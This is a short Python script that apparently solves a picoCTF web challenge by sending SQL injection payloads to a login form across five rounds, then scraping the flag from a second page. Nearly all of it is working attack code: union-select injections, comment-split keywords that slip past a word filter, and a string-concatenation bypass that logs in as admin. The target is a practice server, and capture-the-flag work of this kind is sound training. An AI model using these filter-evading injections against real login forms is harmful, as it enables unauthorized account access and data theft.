import requests
import re
# s = requests.Session()

url = "http://jupiter.challenges.picoctf.org:28955/index.php"


cookies =  dict(PHPSESSID=requests.get(url).cookies['PHPSESSID'])
headers = {"content-type":"application/x-www-form-urlencoded"}


def make_request(username,password, round):
	r = requests.post(url,data="user={}&pass={}".format(username,password), cookies=cookies, headers=headers)
	if re.search("Round {} / 5".format(round+1), r.text) == None:
		print("Round {} didn't work :(".format(round))
	print("Round {} worked!".format(round))



# make_request("a","1' union select * from users where username='admin'-- ",1)
# make_request("a","1' union select * from users where username<'bdmin'/* ",2)
# make_request("a","1'/*union*/union/*select*/select/*test*/*/*from*/from/*users*/users/*limit*/limit/*1*/1/*",3)
# make_request("a","1'/*union*/union/*select*/select/*test*/*/*from*/from/*users*/users/*limit*/limit/*1*/1/*",4)
make_request("'||'adm'||'in'/*","",1)
make_request("'||'adm'||'in'/*","",2)
make_request("'||'adm'||'in'/*","",3)
make_request("'||'adm'||'in'/*","",4)
make_request("'||'adm'||'in'/*","",5)


r = requests.get("http://jupiter.challenges.picoctf.org:28955/filter.php", cookies=cookies)
print(re.search("(picoCTF{.*?})",r.text).group(1))